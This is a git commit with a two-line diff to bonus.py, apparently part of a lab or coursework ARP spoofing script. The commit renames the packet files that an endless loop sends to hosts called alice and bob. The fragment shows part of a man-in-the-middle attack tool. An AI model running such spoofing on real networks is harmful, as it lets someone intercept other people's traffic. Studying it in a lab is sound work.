318af36f9249ef601aff6925c7b1dd41f23b8429
Mohammad Hasib <33131068+Hasib9876@users.noreply.github.com>
2025-12-06 01:51:43 +0100

    Update packet filenames for ARP spoofing

--- bonus.py
+++ bonus.py
@@ -20,7 +20,7 @@ print("--- ARP Spoofing Started ---")
 
 while True:
     # Send to alice
-    send_packet(alice_mac, "bobtoalice.bin", "Sending to Alice")
+    send_packet(alice_mac, "bobtoalicebonus.bin", "Sending to Alice")
     # Send to bob
-    send_packet(bob_mac, "alicetobob.bin", "Sending to Bob")
+    send_packet(bob_mac, "alicetobobbonus.bin", "Sending to Bob")
     time.sleep(wait_time)
